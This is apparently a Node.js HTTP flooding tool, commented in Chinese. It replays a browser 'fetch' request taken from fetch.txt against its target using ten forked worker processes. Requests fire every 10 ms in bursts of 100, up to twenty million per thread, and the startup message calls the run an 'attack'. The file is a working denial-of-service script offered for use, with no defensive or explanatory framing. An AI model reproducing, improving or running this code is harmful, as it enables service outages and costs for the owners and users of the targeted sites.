const cluster = require('cluster');
const os = require('os');
const { Readable } = require('stream');
const util = require('util');
const fs = require('fs');
const v8 = require('v8');

const freeMemory = os.freemem();

const defaultHeapLimit = v8.getHeapStatistics().heap_size_limit;

const maxHeapSize = Math.min(freeMemory, defaultHeapLimit);

v8.setFlagsFromString(`--max-old-space-size=${maxHeapSize}`);
let requestCount = 0;

const numRequests = 20000000; //每个线程总共请求数
const delay = 10;  //间隔多少ms请求一次
const concurrentRequests = 100; //并发数 
const numCPUs = 10; //进程数

let totalBytesReceived = 0; 

const filePath = 'fetch.txt'; // 替换为你的配置文件路径
try {
const fileContent = fs.readFileSync(filePath, 'utf-8');

// 提取 URL
const urlRegex = /fetch\("([^"]+)",/;
const urlMatch = fileContent.match(urlRegex);
const url = urlMatch ? urlMatch[1] : null;

// 提取 headers
const headersRegex = /"headers": {([^}]+)}/;
const headersMatch = fileContent.match(headersRegex);
const headersy = headersMatch ? `{${headersMatch[1]}}` : null;
const headers = headersy ? JSON.parse(headersy) : null;


// 提取 referrerPolicy
const referrerPolicyRegex = /"referrerPolicy": "([^"]+)"/;
const referrerPolicyMatch = fileContent.match(referrerPolicyRegex);
const referrerPolicy = referrerPolicyMatch ? referrerPolicyMatch[1] : 'no-referrer-when-downgrade';

// 提取 body
const bodyRegex = /"body": ([^,}\n\r]+)/;
const bodyMatch = fileContent.match(bodyRegex);
const bodyValue = bodyMatch ? bodyMatch[1].trim() : null;
const body = bodyValue === 'null' || /^\d+$/.test(bodyValue) ? bodyValue : `${bodyValue}`;

// 提取 method
const methodRegex = /"method": "([^"]+)"/;
const methodMatch = fileContent.match(methodRegex);
const method = methodMatch ? methodMatch[1] : 'GET';

// 提取 mode
const modeRegex = /"mode": "([^"]+)"/;
const modeMatch = fileContent.match(modeRegex);
const mode = modeMatch ? modeMatch[1] : 'cors';

if (url) {
  const { URL } = require('url');
  const parsedUrl = new URL(url);
  const protocol = parsedUrl.protocol === 'https:' ? 'https' : 'http';
  const http = require(protocol);
  
} else {
  console.error('你的fetch.txt有问题');
  process.exit();
}
const win8 = os.platform() === 'win32' && parseFloat(os.release()) <= 6.3;

let successCount = 0;
let ErrReq = 0;
let totalRequests = successCount + ErrReq; // 计算总的请求次数

function sendRequest() {
  const { URL } = require('url');
  const parsedUrl = new URL(url);
  const protocol = parsedUrl.protocol === 'https:' ? 'https' : 'http';
  const http = require(protocol);
  
const options = {
  hostname: parsedUrl.hostname,
  port: parseInt(parsedUrl.port) || (protocol === 'https' ? 443 : 80),
  path: parsedUrl.pathname,
  headers: headers,
  referrerPolicy: referrerPolicy,
  body: body,
  method: method,
  mode: mode
};


  const req = http.request(options, (res) => {
    let bytesReceived = 0;  

    res.on('data', (chunk) => {
      bytesReceived += chunk.length;
      totalBytesReceived += chunk.length;
    });

    res.on('end', () => {
		if (win8){successCount++; 
			console.log(`成功${successCount}字节数:${bytesReceived}`);
			if (totalRequests>= numRequests) {
		process.exit();   }
	}else{
	const color = bytesReceived === 0 ? '\x1b[31m' : '\x1b[32m';
		successCount++; 
      console.log(`成功\x1b[32m${successCount}\x1b[0m字节数: ${color}${bytesReceived}\x1b[0m`);
	  if (totalRequests>= numRequests) {
		process.exit();   }
	}
    });
  });

  req.on('error', (error) => {
	  if (win8){
		  console.log(`错误${ErrReq}`);
		  ErrReq++;
		  if (totalRequests>= numRequests) {
		process.exit();   }
	  }else{
  console.error(`错误\x1b[31m${ErrReq}\x1b[0m`);
	ErrReq++;
	if (totalRequests>= numRequests) {
		process.exit();   }
	  }
  });
totalRequests = successCount + ErrReq;
  req.end();
}

if (cluster.isMaster) {
  console.log(`主进程 ${process.pid}我来啦
开始喵喵攻击（打`);

  //const numCPUs = os.cpus().length;

  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  cluster.on('exit', (worker, code, signal) => {
    console.log(`工作进程 ${worker.process.pid}已润`);
  });

  setInterval(() => {
    for (let i = 0; i < concurrentRequests; i++) {
		  
      setTimeout(sendRequest, i * delay);
    }
  }, concurrentRequests * delay);
} else {
  setInterval(sendRequest, delay);
}

}
catch(error){
console.error('你的fetch.txt呢？当前目录没有啊');process.exit();
}